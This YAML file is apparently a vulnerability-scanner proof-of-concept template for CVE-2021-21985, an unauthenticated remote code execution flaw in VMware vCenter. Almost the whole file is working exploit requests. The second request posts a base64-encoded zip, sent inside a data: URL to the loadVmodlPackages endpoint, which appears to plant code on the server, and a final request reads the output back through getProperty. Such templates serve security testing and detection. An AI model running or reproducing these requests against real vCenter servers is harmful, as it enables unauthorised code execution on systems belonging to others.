detail:
  author: envone77
  description: vmware vCenter unauth RCE cve-2021-21985
  links:
  - https://www.anquanke.com/post/id/243098
  - https://github.com/alt3kx/CVE-2021-21985_PoC
  vulnpath: /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData
expression: r0() && r1() && r2()
manual: true
name: poc-yaml-vmware-vcenter-cve-2021-21985-rce
rules:
  r0:
    expression: 'response.status == 200 && response.body.bcontains(b"{\"result\":{\"")
      && response.headers["set-Cookie"].contains("VSPHERE-UI-JSESSIONID")

      '
    request:
      body: '{"methodInput":[{"type":"ClusterComputeResource","value": null,"serverGuid":
        null}]}\x0d\x0a

        '
      cache: true
      headers:
        Content-Type: application/json
      method: POST
      path: /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData
  r1:
    expression: 'response.status == 200

      '
    request:
      body: '{"methodInput": [["https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,UEsDBBQAAAAIADihc1Okxc3arAEAAI8EAAASAAAAb2ZmbGluZV9idW5kbGUueG1spVNNT+MwFLxX4j+YIFWNRG0+biWJBOxlJVZC2z0gIQ6O+5qYdeysn9MUIf77unGBfoFUyCXOezMvM2M7yYFrJPNKaUyj0rl6xFjbthRrK3UxtbyC1ti/1NiCoSih4qyjRAc9Ep6OO5qjXOO35x3l7OTklN39uhl31KHU6LgWsMJGOQpzb4zgThqdvjb3ULMPlgXAsPugc5xEWfhhsqgQOUmjOo+IUBx9JI98xqniuqC31ghAvGqkmoB9JXVEYbwv2whn7JDbYqXlm0qiW6v42oyrBjKWS81yjmXCQmEnaig+bSeH99c/Lv9c3pO2NLyS5Czrn5KHh2wXK2EbahK2W3vSZbUVjMT1YKShP3XduLGzwKvfwPdJ5s3C0XOdU38wrBvEtAC3MnIQv2z72FN0brdEXzXTKViYfF2xxO8LE0YpWEA3Um2cVD6PhX96/Y7JPhiDT+ig2nFix6GxKrC2pgbrnoj21yON2pI7mPkESGcljY6eSRhHEdztEjzo/2uMuzCN8/sS1sckt1RJDei3bOlj8O6HPhqp/SVbMg964R3HMXmJ2GYqYYF+9R9QSwECFAAUAAAACAA4oXNTpMXN2qwBAACPBAAAEgAAAAAAAAAAAAAAtoEAAAAAb2ZmbGluZV9idW5kbGUueG1sUEsFBgAAAAABAAEAQAAAANwBAAAAAA==%23"]]}

        '
      cache: true
      headers:
        Content-Type: application/json
      method: POST
      path: /ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages
  r2:
    expression: 'response.status == 200 && response.body.bcontains(b"{\"result\":")
      && !response.body.bcontains(b"null")

      '
    request:
      body: '{"methodInput": ["output", null]}

        '
      cache: true
      headers:
        Content-Type: application/json
      method: POST
      path: /ui/h5-vsan/rest/proxy/service/systemProperties/getProperty
transport: http
